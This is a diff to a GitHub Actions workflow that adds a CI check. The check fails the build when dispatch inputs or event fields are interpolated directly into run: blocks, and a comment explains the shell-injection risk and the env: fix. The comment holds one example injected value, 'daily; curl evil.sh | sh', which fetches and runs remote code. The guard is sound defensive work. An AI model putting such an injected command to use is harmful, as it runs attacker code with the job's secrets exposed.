@@ -33,6 +33,24 @@ jobs:
           fi
           echo "no scheduled triggers -- correct"
 
+      - name: Refuse a dispatch input interpolated into a run block
+        run: |
+          # A workflow_dispatch input is attacker-supplied text. Written as
+          # `run: cmd ${{ inputs.x }}` it is substituted into the shell script
+          # BEFORE the shell parses it, so `daily; curl evil.sh | sh` runs as
+          # two commands with every job secret in scope. Quoting the
+          # expression does not help -- the value can contain quotes.
+          #
+          # The fix is always the same shape: bind it under `env:` and read
+          # "$VAR" in the script, where it is data the shell never re-parses.
+          # This guard exists because the unsafe form is the one that reads
+          # more naturally, so it comes back.
+          if grep -rnE '^[[:space:]]*(run:|-[[:space:]]+)?.*\$\{\{[[:space:]]*(inputs|github\.event\.(inputs|issue|comment|pull_request))'                .github/workflows/ | grep -vE '^[^:]+:[0-9]+:[[:space:]]*(#|if:|[A-Z_]+:)' ; then
+            echo "::error::a dispatch input is interpolated into a run: block. Pass it via env: and read \"\$VAR\"."
+            exit 1
+          fi
+          echo "no inputs interpolated into run blocks -- correct"
+
       - name: data/public must be committable
         run: |
           # `data/` (with a trailing slash) in .gitignore makes every later
